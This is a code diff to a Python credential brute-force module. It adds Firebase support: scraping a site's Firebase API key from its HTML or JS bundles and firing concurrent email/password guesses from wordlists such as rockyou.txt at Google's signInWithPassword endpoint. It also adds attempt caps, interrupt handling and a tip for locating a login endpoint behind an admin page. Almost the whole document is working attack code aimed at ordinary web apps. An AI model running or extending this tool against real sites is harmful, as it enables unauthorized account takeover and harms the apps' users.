@@ -31,8 +31,12 @@ class CredentialTester(BaseModule):
         # ── Custom wordlist overrides ──────────────────────────────────────────
         # Pass via config:  {'userlist': '/path/users.txt', 'passlist': '/path/rockyou.txt'}
         # Or via CLI flags: --userlist /path/users.txt  --passlist /path/rockyou.txt
-        self.custom_userlist = config.get('userlist', None)
-        self.custom_passlist = config.get('passlist', None)
+        self.custom_userlist  = config.get('userlist', None)
+        self.custom_passlist  = config.get('passlist', None)
+        # Max entries read from each wordlist — keeps attempts manageable
+        # Raise these via config if you need a deeper search
+        self._max_usernames   = config.get('max_usernames', 200)
+        self._max_passwords   = config.get('max_passwords', 2000)
 
     # ─────────────────────────────────────────────────────────────────────────
     # Progress bar (pure terminal, no extra dependencies)
@@ -65,11 +69,11 @@ class CredentialTester(BaseModule):
             self.logger.info("Brute force testing disabled (use --enable-brute-force to enable)")
             return self.findings
 
-        # ── Pull custom wordlists from kwargs if passed via CLI ───────────────
-        if kwargs.get('userlist'):
-            self.custom_userlist = kwargs['userlist']
-        if kwargs.get('passlist'):
-            self.custom_passlist = kwargs['passlist']
+        # ── Pull custom wordlists / caps from kwargs ──────────────────────────
+        if kwargs.get('userlist'):      self.custom_userlist = kwargs['userlist']
+        if kwargs.get('passlist'):      self.custom_passlist = kwargs['passlist']
+        if kwargs.get('max_usernames'): self._max_usernames  = kwargs['max_usernames']
+        if kwargs.get('max_passwords'): self._max_passwords  = kwargs['max_passwords']
 
         # ── Print wordlist banner ─────────────────────────────────────────────
         ulist_label = self.custom_userlist or f"{self.wordlist_path}/usernames.txt (default)"
@@ -77,29 +81,36 @@ class CredentialTester(BaseModule):
         print(f"\033[96m[*] Userlist : {ulist_label}\033[0m")
         print(f"\033[96m[*] Passlist : {plist_label}\033[0m")
 
-        # ── Build endpoint directly from the supplied target URL ──────────────
+        # ── Build endpoint ────────────────────────────────────────────────────
         target_url = target if target.startswith(('http://', 'https://')) else f"https://{target}"
+        endpoint   = await self._probe_single_endpoint(target_url)
 
-        # Quickly probe the target to detect form type — single request only
-        endpoint = await self._probe_single_endpoint(target_url)
-
-        print(f"\033[96m[*] Form type detected: \033[93m{endpoint['form_type']}\033[0m")
-        print(f"\033[96m[*] Target URL        : {endpoint['url']}\033[0m\n")
+        print(f"\033[96m[*] Form type detected : \033[93m{endpoint['form_type']}\033[0m")
+        print(f"\033[96m[*] Attack URL         : \033[93m{endpoint['url']}\033[0m\n")
 
         await self._test_brute_force(endpoint)
         return self.findings
 
     # ─────────────────────────────────────────────────────────────────────────
-    # Single fast probe — replaces the slow full discovery scan
+    # Single fast probe — detects form type INCLUDING Firebase / SPA apps
     # ─────────────────────────────────────────────────────────────────────────
     async def _probe_single_endpoint(self, url: str) -> Dict:
         """
-        Fire ONE request to the target URL to detect form type and fields.
-        Falls back to safe html_form defaults if the request fails.
-        This replaces _discover_login_forms for the direct-target workflow.
+        Fire ONE request to detect form type.
+
+        Special handling for Firebase / SPA apps
+        ──────────────────────────────────────────
+        Sites like Firebase (*.web.app) render their login via JavaScript.
+        The HTML page itself has no <form> — the login call goes to:
+            https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>
+        We detect the Firebase API key from the page source and build the
+        correct endpoint automatically.
         """
+        from urllib.parse import urlparse
+        import re
+
         default_fields = {
-            'username_fields': ['email', 'username', 'user', 'login', 'name'],
+            'username_fields': ['email'],
             'password_field':  'password',
             'username_field':  'email',
             'email_field':     'email',
@@ -108,25 +119,87 @@ class CredentialTester(BaseModule):
             'method':          'POST',
         }
 
+        parsed  = urlparse(url)
+        base    = f"{parsed.scheme}://{parsed.netloc}"
+        text    = ''
+        headers = {}
+
         try:
             response = await self._make_request(url)
             if response:
                 text    = await response.text()
                 headers = response.headers
-                ft      = self._detect_form_type(url, text, headers)
-                fields  = self._extract_form_fields(text)
-            else:
-                ft, fields = 'html_form', default_fields
         except Exception as e:
-            self.logger.warning(f"Probe failed ({e}), using html_form defaults")
-            ft, fields = 'html_form', default_fields
+            self.logger.warning(f"Probe failed ({e}), using defaults")
+
+        # ── Firebase detection ────────────────────────────────────────────────
+        # Look for the Firebase API key embedded in the page or linked JS files
+        firebase_key = None
+        firebase_hints = [
+            'firebase', 'firebaseapp.com', 'identitytoolkit',
+            'web.app', 'firebaseconfig', 'apiKey'
+        ]
+        is_firebase = any(h in text.lower() for h in firebase_hints) or 'web.app' in url or 'firebaseapp.com' in url
+
+        if is_firebase:
+            # Try to extract the API key directly from inline script
+            key_match = re.search(
+                r'["\']?apiKey["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]+)["\']',
+                text
+            )
+            if key_match:
+                firebase_key = key_match.group(1)
+                print(f"\033[92m[+] Firebase API key found in page source\033[0m")
+            else:
+                # Try to fetch linked JS bundles to find the key
+                js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', text)
+                for js_path in js_urls[:5]:   # check first 5 JS files only
+                    js_url = js_path if js_path.startswith('http') else base + '/' + js_path.lstrip('/')
+                    try:
+                        js_resp = await self._make_request(js_url)
+                        if js_resp:
+                            js_text = await js_resp.text()
+                            km = re.search(
+                                r'["\']?apiKey["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]+)["\']',
+                                js_text
+                            )
+                            if km:
+                                firebase_key = km.group(1)
+                                print(f"\033[92m[+] Firebase API key found in {js_url}\033[0m")
+                                break
+                    except Exception:
+                        pass
+
+            if firebase_key:
+                firebase_url = (
+                    f"https://identitytoolkit.googleapis.com/v1/"
+                    f"accounts:signInWithPassword?key={firebase_key}"
+                )
+                print(f"\033[92m[+] Firebase endpoint : {firebase_url[:80]}...\033[0m")
+                return {
+                    'url':       firebase_url,
+                    'type':      'firebase',
+                    'form_type': 'firebase',
+                    'fields':    default_fields,
+                    'is_api':    True,
+                }
+            else:
+                # Firebase app but couldn't extract key — warn and use best-guess
+                print(f"\033[93m[!] Firebase app detected but API key not found in source.\033[0m")
+                print(f"\033[93m    The login may be handled by a bundled JS file.\033[0m")
+                print(f"\033[93m    Tip: open DevTools → Network tab → filter 'signInWithPassword'\033[0m")
+                print(f"\033[93m         then pass the full URL as target instead of admin.html\033[0m")
+
+        # ── Standard form / API detection ─────────────────────────────────────
+        ft     = self._detect_form_type(url, text, headers)
+        fields = self._extract_form_fields(text) if text else default_fields
 
         return {
             'url':       url,
             'type':      'direct',
             'form_type': ft,
             'fields':    fields,
-            'is_api':    ft in ('json_api', 'graphql', 'oauth2', 'jwt_login', 'ajax_form'),
+            'is_api':    ft in ('json_api', 'graphql', 'oauth2', 'jwt_login', 'ajax_form', 'firebase'),
         }
 
     # ─────────────────────────────────────────────────────────────────────────
@@ -310,6 +383,12 @@ class CredentialTester(BaseModule):
             result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
             result['headers']['Cookie']       = 'wordpress_test_cookie=WP+Cookie+check'
 
+        elif form_type == 'firebase':
+            # Firebase REST API: POST JSON with email + password fields
+            result['data']     = {'email': username, 'password': password, 'returnSecureToken': True}
+            result['use_json'] = True
+            result['headers']['Content-Type'] = 'application/json'
+
         else:
             payload = {password_field: password}
             for f in username_fields: payload[f] = username
@@ -382,22 +461,36 @@ class CredentialTester(BaseModule):
         usernames: List[str] = []
         passwords: List[str] = []
 
+        # ── Hard caps — prevents billion-attempt hangs ─────────────────────
+        # Raise via CLI config if you need more:  --max-usernames 500 --max-passwords 5000
+        MAX_U = getattr(self, '_max_usernames', 200)
+        MAX_P = getattr(self, '_max_passwords', 2000)
+
+        def _load_capped(path, label, cap):
+            lines = []
+            with open(path, 'r', errors='ignore') as fh:
+                for line in fh:
+                    s = line.strip()
+                    if s:
+                        lines.append(s)
+                    if len(lines) >= cap:
+                        break
+            flag = f' \033[91m(capped — use --max-{label.split()[0].lower()}s N to raise)\033[0m' if len(lines) == cap else ''
+            print(f"\033[92m[+] {label}: {path} ({len(lines)} entries{flag})\033[0m")
+            return lines
+
         # ── Usernames ─────────────────────────────────────────
         if self.custom_userlist:
             upath = Path(self.custom_userlist)
             if upath.exists():
-                with open(upath, 'r', errors='ignore') as f:
-                    usernames = [l.strip() for l in f if l.strip()]
-                print(f"\033[92m[+] Custom userlist loaded : {upath} ({len(usernames)} entries)\033[0m")
+                usernames = _load_capped(upath, 'Custom userlist', MAX_U)
             else:
                 self.logger.warning(f"Custom userlist not found: {upath}, falling back to default")
 
         if not usernames:
             upath = Path(self.wordlist_path) / 'usernames.txt'
             if upath.exists():
-                with open(upath, 'r', errors='ignore') as f:
-                    usernames = [l.strip() for l in f if l.strip()]
-                print(f"\033[92m[+] Userlist loaded        : {upath} ({len(usernames)} entries)\033[0m")
+                usernames = _load_capped(upath, 'Userlist      ', MAX_U)
             else:
                 usernames = ['admin', 'administrator', 'user', 'test', 'root', 'admin@email.com']
                 print(f"\033[93m[!] No userlist found — using {len(usernames)} built-in defaults\033[0m")
@@ -406,18 +499,14 @@ class CredentialTester(BaseModule):
         if self.custom_passlist:
             ppath = Path(self.custom_passlist)
             if ppath.exists():
-                with open(ppath, 'r', errors='ignore') as f:
-                    passwords = [l.strip() for l in f if l.strip()]
-                print(f"\033[92m[+] Custom passlist loaded : {ppath} ({len(passwords)} entries)\033[0m")
+                passwords = _load_capped(ppath, 'Custom passlist', MAX_P)
             else:
                 self.logger.warning(f"Custom passlist not found: {ppath}, falling back to default")
 
         if not passwords:
             ppath = Path(self.wordlist_path) / 'passwords.txt'
             if ppath.exists():
-                with open(ppath, 'r', errors='ignore') as f:
-                    passwords = [l.strip() for l in f if l.strip()]
-                print(f"\033[92m[+] Passlist loaded        : {ppath} ({len(passwords)} entries)\033[0m")
+                passwords = _load_capped(ppath, 'Passlist       ', MAX_P)
             else:
                 passwords = ['admin', 'password', '123456', 'login', 'admin123']
                 print(f"\033[93m[!] No passlist found — using {len(passwords)} built-in defaults\033[0m")
@@ -459,10 +548,11 @@ class CredentialTester(BaseModule):
         password_field  = fields.get('password_field',  'password')
 
         base_usernames, passwords = self._load_wordlists()
-        all_usernames  = list(self._generate_username_variations(base_usernames))
+        # Variations disabled — wordlist already has the right entries
+        all_usernames  = list(dict.fromkeys(base_usernames))  # deduplicate, preserve order
         total_attempts = len(all_usernames) * len(passwords)
 
-        print(f"\033[96m[*] Usernames (with variations) : {len(all_usernames)}\033[0m")
+        print(f"\033[96m[*] Usernames  : {len(all_usernames)}\033[0m")
         print(f"\033[96m[*] Passwords                   : {len(passwords)}\033[0m")
         print(f"\033[96m[*] Total attempts              : {total_attempts}\033[0m")
         print(f"\033[96m[*] Concurrent workers          : {self.concurrency}\033[0m\n")
@@ -540,7 +630,15 @@ class CredentialTester(BaseModule):
         # ── Launch all tasks ──────────────────────────────────────────────────
         tasks = [asyncio.create_task(attempt(u, p))
                  for u, p in itertools.product(all_usernames, passwords)]
-        await asyncio.gather(*tasks, return_exceptions=True)
+        try:
+            await asyncio.gather(*tasks, return_exceptions=True)
+        except (KeyboardInterrupt, asyncio.CancelledError):
+            # Cancel every pending task immediately so Ctrl+C exits fast
+            for t in tasks:
+                t.cancel()
+            sys.stdout.write('\n')
+            print(f"\033[93m[!] Brute force interrupted after {counter[0]} attempts\033[0m")
+            return
 
         # Ensure progress bar ends on its own line
         if counter[0] < total_attempts:
